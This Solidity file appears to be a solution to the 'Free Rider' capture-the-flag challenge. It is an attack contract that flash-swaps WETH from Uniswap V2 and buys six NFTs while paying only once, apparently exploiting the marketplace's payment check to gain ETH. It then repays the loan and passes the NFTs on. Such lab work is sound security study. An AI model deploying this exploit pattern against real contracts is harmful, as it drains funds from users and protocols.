pragma solidity ^0.8.0;

import '../free-rider/IUniswapV2Pair.sol';
import '../free-rider/FreeRiderNFTMarketplace.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, 
                           bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint wad) external payable;
    function transfer(address dst, uint wad) external returns (bool); 
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {

    IUniswapV2Pair pair;
    IWETH weth;
    IERC721 nft;
    FreeRiderNFTMarketplace marketplace;
    address buyerContract;

    constructor(
        address _pair, address _weth, address _nft, 
        address _market, address _buyerContract) {
        pair = IUniswapV2Pair(_pair);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(payable(_market));
        buyerContract = _buyerContract;
    }

    function attack() public {
        // execute flashswap
        pair.swap(0, 15 ether, address(this), hex'00');
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1,
                           bytes calldata data) external override {
        // convert our flashswapped WETH to ETH
        weth.withdraw(15 ether);
        uint256[] memory tokenIds = new uint[](6);
        for (uint i=0; i<6; i++)
            tokenIds[i] = i;

        // we end up with 90 ETH after this call
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // get enough WETH to pay the fee, pay back flash swap
        address(weth).call{value: 15.1 ether}(''); 
        weth.transfer(address(pair), 15.1 ether); 

        // transfer the NFTs to buyer contract
        for (uint i=0; i<6; i++)
            nft.safeTransferFrom(address(this), buyerContract, i);
    }

    receive() external payable {}

    function onERC721Received(address,address,uint256,bytes memory) 
        external
        override
        returns (bytes4) 
    {
        return 0x150b7a02;
    }

}
